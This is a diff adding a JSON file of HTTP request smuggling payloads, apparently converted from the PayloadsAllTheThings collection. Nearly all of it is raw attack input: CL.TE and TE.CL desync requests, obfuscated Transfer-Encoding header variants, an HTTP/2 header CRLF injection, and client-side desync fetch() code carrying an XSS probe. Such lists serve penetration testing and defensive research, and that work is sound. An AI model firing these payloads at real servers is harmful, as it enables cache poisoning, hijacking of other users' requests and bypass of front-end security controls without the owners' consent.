@@ -1,0 +1,99 @@
+{
+  "source": "PayloadsAllTheThings",
+  "exploit_type": "request_smuggling",
+  "original_category": "Request Smuggling",
+  "payloads": [
+    {
+      "category": "CL.TE Vulnerabilities",
+      "escalation": "baseline",
+      "lines": [
+        "POST / HTTP/1.1",
+        "Host: vulnerable-website.com",
+        "Content-Length: 13",
+        "Transfer-Encoding: chunked",
+        "0",
+        "SMUGGLED",
+        "POST / HTTP/1.1",
+        "Host: domain.example.com",
+        "Connection: keep-alive",
+        "Content-Type: application/x-www-form-urlencoded",
+        "Content-Length: 6",
+        "Transfer-Encoding: chunked",
+        "0",
+        "G"
+      ]
+    },
+    {
+      "category": "TE.CL Vulnerabilities",
+      "escalation": "baseline",
+      "lines": [
+        "POST / HTTP/1.1",
+        "Host: vulnerable-website.com",
+        "Content-Length: 3",
+        "Transfer-Encoding: chunked",
+        "8",
+        "SMUGGLED",
+        "0",
+        "POST / HTTP/1.1",
+        "Host: domain.example.com",
+        "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86",
+        "Content-Length: 4",
+        "Connection: close",
+        "Content-Type: application/x-www-form-urlencoded",
+        "Accept-Encoding: gzip, deflate",
+        "5c",
+        "GPOST / HTTP/1.1",
+        "Content-Type: application/x-www-form-urlencoded",
+        "Content-Length: 15",
+        "x=1",
+        "0"
+      ]
+    },
+    {
+      "category": "TE.TE Vulnerabilities",
+      "escalation": "baseline",
+      "lines": [
+        "Transfer-Encoding: xchunked",
+        "Transfer-Encoding : chunked",
+        "Transfer-Encoding: chunked",
+        "Transfer-Encoding: x",
+        "Transfer-Encoding:[tab]chunked",
+        "[space]Transfer-Encoding: chunked",
+        "X: X[\\n]Transfer-Encoding: chunked",
+        "Transfer-Encoding",
+        ": chunked"
+      ]
+    },
+    {
+      "category": "HTTP/2 Request Smuggling",
+      "escalation": "baseline",
+      "lines": [
+        ":method GET",
+        ":path /",
+        ":authority www.example.com",
+        "header ignored\\r\\n\\r\\nGET / HTTP/1.1\\r\\nHost: www.example.com"
+      ]
+    },
+    {
+      "category": "Client-Side Desync",
+      "escalation": "baseline",
+      "lines": [
+        "POST / HTTP/1.1",
+        "Host: www.example.com",
+        "Content-Length: 37",
+        "GET / HTTP/1.1",
+        "Host: www.example.com",
+        "fetch('https://www.example.com/', {method: 'POST', body: \"GET / HTTP/1.1\\r\\nHost: www.example.com\", mode: 'no-cors', credentials: 'include'} )",
+        "fetch('https://www.example.com/redirect', {",
+        "method: 'POST',",
+        "body: `HEAD /404/ HTTP/1.1\\r\\nHost: www.example.com\\r\\n\\r\\nGET /x?x=<script>alert(1)</script> HTTP/1.1\\r\\nX: Y`,",
+        "credentials: 'include',",
+        "mode: 'cors' // throw an error instead of following redirect",
+        "}).catch(() => {",
+        "location = 'https://www.example.com/'",
+        "})"
+      ]
+    }
+  ],
+  "converted_at": "2026-04-03T07:48:28.860Z"
+}
